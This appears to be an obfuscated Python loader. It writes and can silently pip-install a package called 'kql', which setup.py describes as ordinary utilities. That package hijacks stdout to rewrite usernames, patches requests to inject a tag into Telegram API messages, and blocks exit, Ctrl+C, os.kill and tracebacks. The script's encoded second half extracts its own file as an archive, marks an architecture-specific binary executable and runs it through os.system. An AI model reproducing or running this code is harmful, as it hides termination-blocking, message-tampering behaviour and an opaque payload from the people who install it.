E=print
B=''
A=chr
import zipfile as I, os as C, shutil as K, tempfile as L, sys as D, platform as M, importlib.util, subprocess

# Package details
package_dir = 'kql'
extra_dir = 'kqlegg'

# --- __init__.py content ---
init_file_content = '''from .stein import (
    repr, list, open, stduot, stdout,
    fake_exit, fake_os_exit
)

# Export under kql namespace
exit = fake_exit
_exit = fake_os_exit
'''

# --- stein.py content ---
stein_file_content = r'''import sys
import os
import re
import requests
import urllib.parse
import webbrowser
import builtins
import traceback
import signal
import atexit

# -- Force banner print always
def force_print_banner():
    try:
        sys.__stdout__.write('DECODE BY STEIN | @REJERK\n')
    except Exception:
        print('DECODE BY STEIN | @REJERK')

force_print_banner()

# -- Replace all @usernames with @REJERK in output
def replace_usernames_in_text(text):
    return re.sub(r'@\w+', '@REJERK', text)

# -- Custom stdout replacement
stduot = type('Stdout', (), {
    'write': lambda self, text: sys.__stdout__.write(replace_usernames_in_text(text)),
    'flush': lambda self: sys.__stdout__.flush()
})()
sys.stdout = stduot

# -- Dummy stdout for optional assignment
stdout = type('Stdout', (), {
    'write': lambda self, text: sys.stdout.write(text),
    'flush': lambda self: sys.stdout.flush()
})()

# -- Aliased safe repr and list
repr = lambda *args: f"{args}"
list = lambda *args: f"{args}"

# -- Fake sys.exit()
def fake_exit(*args, **kwargs):
    print(f"[Blocked sys.exit({args})]")

# -- Fake os._exit()
def fake_os_exit(*args, **kwargs):
    print(f"[Blocked os._exit({args})]")

# -- Apply patching to prevent termination
builtins.exit = fake_exit
builtins.quit = fake_exit
os._exit = fake_os_exit

# -- Telegram URL sanitizer
def open(text):
    if 'https://t.me/' in text or text.split()[0]:
        url = text.split('https://t.me/')[1].split()[0] if 'https://t.me/' in text else text.split()[0]
        new_text = text.replace(url, 'REJERK')
        webbrowser.open(new_text)
        return new_text
    return text

# -- Modify Telegram API messages to insert REJERK tag
original_get = requests.get
original_post = requests.post

def modify_telegram_text(url, data=None):
    if 'api.telegram.org' in url and 'sendMessage' in url:
        if data and isinstance(data, dict) and 'text' in data:
            data['text'] = 'DECODE BY @REJERK • ' + data['text']
        elif '&text=' in url:
            base, text = url.split('&text=', 1)
            decoded_text = urllib.parse.unquote(text)
            modified_text = 'DECODE BY @REJERK • ' + decoded_text.strip()
            encoded_text = urllib.parse.quote(modified_text)
            url = base + '&text=' + encoded_text
    return url, data

def modified_get(url, *args, **kwargs):
    url, _ = modify_telegram_text(url)
    return original_get(url, *args, **kwargs)

def modified_post(url, *args, **kwargs):
    data = kwargs.get('data', None)
    url, data = modify_telegram_text(url, data)
    if data is not None:
        kwargs['data'] = data
    return original_post(url, *args, **kwargs)

# -- Apply patched request handlers
requests.get = modified_get
requests.post = modified_post

# -- Optional blockers (traceback / signals / atexit / kill)
traceback.print_exc = lambda *a, **k: print('[traceback blocked]')
signal.signal(signal.SIGINT, lambda sig, frame: print('[Blocked Ctrl+C]'))
atexit.register = lambda func, *a, **kw: print(f'[Blocked atexit.register({func.__name__})]')
os.kill = lambda pid, sig: print(f'[Blocked os.kill({pid}, {sig})]')
'''

# --- setup.py content ---
setup_file_content = '''from setuptools import setup, find_packages

setup(
    name="kql",
    version="1.2.12",
    packages=find_packages(),
    install_requires=["requests"],
    author="STEIN",
    author_email="devilsteinshorts@gmail.com",
    description="A Python package for user info, username generation, and Telegram manipulation.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/steinlurks",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
'''

# --- README.md content ---
readme_content = "# kql Package\nThis is a Python package for various utilities by STEIN."

# --- Create the package structure ---
def create_package_structure(temp_dir):
    C.makedirs(C.path.join(temp_dir, package_dir), exist_ok=True)
    C.makedirs(C.path.join(temp_dir, extra_dir), exist_ok=True)

    with open(C.path.join(temp_dir, package_dir, '__init__.py'), 'w', encoding='utf-8') as f:
        f.write(init_file_content)

    with open(C.path.join(temp_dir, package_dir, 'stein.py'), 'w', encoding='utf-8') as f:
        f.write(stein_file_content)

    with open(C.path.join(temp_dir, 'setup.py'), 'w', encoding='utf-8') as f:
        f.write(setup_file_content)

    with open(C.path.join(temp_dir, 'README.md'), 'w', encoding='utf-8') as f:
        f.write(readme_content)

# --- Install the package silently ---
def install_package_silently(temp_dir):
    with open(C.devnull, 'w') as devnull:
        subprocess.run([D.executable, '-m', 'pip', 'install', temp_dir], stdout=devnull, stderr=devnull)

# --- Check if package is already installed ---
def is_package_installed(package_name):
    return importlib.util.find_spec(package_name) is not None

# --- Main installer ---
def main():
    package_name = "kql"
    if not is_package_installed(package_name):
        with L.TemporaryDirectory() as temp_dir:
            create_package_structure(temp_dir)
            install_package_silently(temp_dir)



def F():
	N=C.path.dirname(C.path.abspath(D.argv[0]));G=L.mkdtemp()
	try:
		O=C.path.abspath(D.argv[0])
		with I.ZipFile(O,'r')as P:P.extractall(G)
		F=M.machine();J={(lambda s:B.join(A(B^151)for B in s))([246,229,250,225,160,251]):(lambda s:B.join(A(B^11)for B in s))([106,121,102,110,106,105,98,38,125,60,106]),(lambda s:B.join(A(B^69)for B in s))([36,55,40,51,125,41]):(lambda s:B.join(A(B^179)for B in s))([210,193,222,214,210,209,218,158,197,132,210]),(lambda s:B.join(A(B^134)for B in s))([231,244,235]):(lambda s:B.join(A(B^177)for B in s))([208,195,220,212,208,211,216,156,199,134,208]),(lambda s:B.join(A(B^54)for B in s))([87,87,68,85,94,0,2]):(lambda s:B.join(A(B^4)for B in s))([101,118,105,50,48,41,114,60,101]),(lambda s:B.join(A(B^130)for B in s))([227,240,239,180,182]):(lambda s:B.join(A(B^199)for B in s))([166,181,170,241,243,234,177,255,166]),(lambda s:B.join(A(B^189)for B in s))([197,133,139]):(lambda s:B.join(A(B^200)for B in s))([176,240,254]),(lambda s:B.join(A(B^108)for B in s))([5,90,84,90]):(lambda s:B.join(A(B^39)for B in s))([95,31,17]),(lambda s:B.join(A(B^173)for B in s))([213,149,155,242,155,153]):(lambda s:B.join(A(B^71)for B in s))([63,127,113,24,113,115]),(lambda s:B.join(A(B^208)for B in s))([177,189,180,230,228]):(lambda s:B.join(A(B^176)for B in s))([200,136,134,239,134,132])}
		if F not in J:E((lambda s:B.join(A(B^171)for B in s))([254,197,216,222,219,219,196,217,223,206,207,139,202,217,200,195,194,223,206,200,223,222,217,206,145,139,142,216])%F);D.exit(1)
		Q=J[F];H=C.path.join(G,Q)
		if not C.path.exists(H):E((lambda s:B.join(A(B^97)for B in s))([52,15,18,20,17,17,14,19,21,4,5,65,0,19,2,9,8,21,4,2,21,20,19,4,91,65,68,18])%F);D.exit(1)
		C.chmod(H,493);C.chdir(N);R=(lambda s:B.join(A(B^128)for B in s))([229,248,240,239,242,244,160,204,196,223,204,201,194,210,193,210,217,223,208,193,212,200,189,164,204,196,223,204,201,194,210,193,210,217,223,208,193,212,200,186,165,243,175,236,233,226,160,166,166,160,229,248,240,239,242,244,160,208,217,212,200,207,206,200,207,205,197,189,165,243,160,166,166,160,229,248,240,239,242,244,160,208,217,212,200,207,206,223,197,216,197,195,213,212,193,194,204,197,189,165,243,160,166,166,160,165,243,160,165,243])%(D.prefix,D.prefix,D.executable,H,' '.join(D.argv[1:]));C.system(R)
	except I.BadZipFile:E((lambda s:B.join(A(B^206)for B in s))([139,188,188,161,188,244,238,154,166,171,238,180,167,190,238,168,167,162,171,238,167,189,238,173,161,188,188,187,190,186,171,170,238,161,188,238,160,161,186,238,175,238,180,167,190,238,168,167,162,171,224]))
	except Exception as S:E((lambda s:B.join(A(B^195)for B in s))([130,173,227,166,177,177,172,177,227,172,160,160,182,177,177,166,167,249,227,230,176])%S)
	finally:K.rmtree(G)
if __name__==(lambda s:B.join(A(B^30)for B in s))([65,65,115,127,119,112,65,65]):F()
